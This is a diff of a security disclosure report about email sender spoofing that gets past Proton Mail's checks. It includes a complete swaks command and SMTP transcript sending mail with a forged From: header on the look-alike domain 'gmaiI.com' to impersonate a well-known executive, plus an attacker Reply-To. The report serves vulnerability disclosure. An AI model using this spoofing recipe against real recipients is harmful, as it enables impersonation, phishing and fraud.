@@ -48,7 +48,7 @@ The relevant properties of the crafted message:
 - **envelope sender:** an address on a domain that publishes no DMARC record
 - **`From:` display name:** a full, address-shaped string on a look-alike domain
   (`gmaiI.com`, capital i, reading as `gmail.com`), presented as a well-known
-  real person
+  real person. This can be reproduced with other domains using the same technic
 - **`Reply-To:`** pointing at an unrelated, attacker-controlled address
 
 Result: SPF evaluation fails, but because the sending domain publishes no DMARC
@@ -61,24 +61,78 @@ legitimate domain.
 To confirm the font issue independently: render `gmail.com` and `gmaiI.com`
 (capital i) side by side in SF Pro or any `system-ui` sans-serif and compare.
 
-**Evidence:**
+## Evidence:
 
-- <img width="1055" height="101" alt="Screenshot 2026-09-07 at 18 47 37" src="https://github.com/user-attachments/assets/b6e0996f-b24b-4ed1-8c92-825436b4cf13" /> — the spoofed message in the inbox, with no
-  authentication warning.
-- <img width="1339" height="394" alt="Screenshot 2026-09-07 at 18 47 47" src="https://github.com/user-attachments/assets/b7131360-dd56-40e2-bc6d-90063b957ab7" /> — the opened message showing the look-alike
-  sender in the address position.
-- <img width="413" height="175" alt="Screenshot 2026-09-07 at 19 12 53" src="https://github.com/user-attachments/assets/adbb5a04-dd21-4a7b-abd5-b1f180585b63" />
- — the macOS desktop notification for the
-  spoofed message, showing the forged sender (`"Real Sundar Pichai"
-  sundar@gmaiI.com`) rendered at the OS level, outside the app entirely.
+The spoofed message in the inbox, with no authentication warning:
 
-> **Comparison note.** A prior draft of this report compared Proton's handling to
-> Gmail's. That comparison is omitted here: the Gmail rejection captured at the
-> time was a sender-reputation rejection (IPv6 PTR / `550-5.7.1`), not an
-> authentication or homograph decision, and did not actually demonstrate the
-> contrast claimed. Anyone reproducing a cross-provider comparison should send
-> from a host with correct forward-confirmed reverse DNS so reputation rejections
-> don't confound the result.
+<img width="1055" height="101" alt="Screenshot 2026-09-07 at 18 47 37" src="https://github.com/user-attachments/assets/b6e0996f-b24b-4ed1-8c92-825436b4cf13" />
+
+The opened message showing the look-alike sender in the address position:
+
+<img width="1339" height="394" alt="Screenshot 2026-09-07 at 18 47 47" src="https://github.com/user-attachments/assets/b7131360-dd56-40e2-bc6d-90063b957ab7" />
+
+The macOS desktop notification for the spoofed message, showing the forged sender (`"Real Sundar Pichai"  sundar@gmaiI.com`) rendered at the OS level, outside the app entirely
+
+<img width="413" height="175" alt="Screenshot 2026-09-07 at 19 12 53" src="https://github.com/user-attachments/assets/adbb5a04-dd21-4a7b-abd5-b1f180585b63" />
+
+
+```
+$ swaks --to alovida@proton.me  --from 'alonso@gmail.com'  --h-From '"Real Sundar Pichai" sundar@gmaiI.com'  --add-header 'Reply-To: The Real Email <my_real_email@gmail.com>'  --server mail.protonmail.ch:25 --tls  --body "test"
+=== Trying mail.protonmail.ch:25...
+=== Connected to mail.protonmail.ch.
+<-  220-mailinzur105.protonmail.ch ESMTP Postfix
+<-  220 mailinzur105.protonmail.ch ESMTP Postfix
+ -> EHLO tras2.es
+<-  250-mailinzur105.protonmail.ch
+<-  250-PIPELINING
+<-  250-SIZE 71500000
+<-  250-STARTTLS
+<-  250-ENHANCEDSTATUSCODES
+<-  250-8BITMIME
+<-  250 CHUNKING
+ -> STARTTLS
+<-  220 2.0.0 Ready to start TLS
+=== TLS started with cipher TLSv1.3:TLS_AES_256_GCM_SHA384:256
+=== TLS client certificate not requested and not sent
+=== TLS no client certificate set
+=== TLS peer[0]   subject=[/CN=protonmail.com]
+===               commonName=[protonmail.com], subjectAltName=[DNS:*.pm.me, DNS:*.protonmail.ch, DNS:*.protonmail.com, DNS:*.protonvpn.ch, DNS:*.protonvpn.com, DNS:protonmail.com] notAfter=[2026-10-11T13:14:36Z]
+=== TLS peer[1]   subject=[/C=US/O=Let's Encrypt/CN=YR1]
+===               commonName=[YR1], subjectAltName=[] notAfter=[2028-09-02T23:59:59Z]
+=== TLS peer[2]   subject=[/C=US/O=ISRG/CN=Root YR]
+===               commonName=[Root YR], subjectAltName=[] notAfter=[2032-09-02T23:59:59Z]
+=== TLS peer certificate passed CA verification, passed host verification (using host mail.protonmail.ch to verify)
+ ~> EHLO tras2.es
+<~  250-mailinzur105.protonmail.ch
+<~  250-PIPELINING
+<~  250-SIZE 71500000
+<~  250-ENHANCEDSTATUSCODES
+<~  250-8BITMIME
+<~  250-CHUNKING
+<~  250 REQUIRETLS
+ ~> MAIL FROM:<alonso@gmail.com>
+<~  250 2.1.0 Ok
+ ~> RCPT TO:<alovida@proton.me>
+<~  250 2.1.5 Ok
+ ~> DATA
+<~  354 End data with <CR><LF>.<CR><LF>
+ ~> Date: Mon, 07 Sep 2026 17:12:33 +0000
+ ~> To: alovida@proton.me
+ ~> From: "Real Sundar Pichai" sundar@gmaiI.com
+ ~> Subject: test Mon, 07 Sep 2026 17:12:33 +0000
+ ~> Message-Id: <20260907171233.2356271@tras2.es>
+ ~> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
+ ~> Reply-To: The Real Email <my_real_email@gmail.com>
+ ~>
+ ~> test
+ ~>
+ ~>
+ ~> .
+<~  250 2.0.0 Ok: queued as 4hdttH2j7xz5Q
+ ~> QUIT
+<~  221 2.0.0 Bye
+=== Connection closed with remote host.
+```
 
 ## Timeline of interactions with Proton Security
 
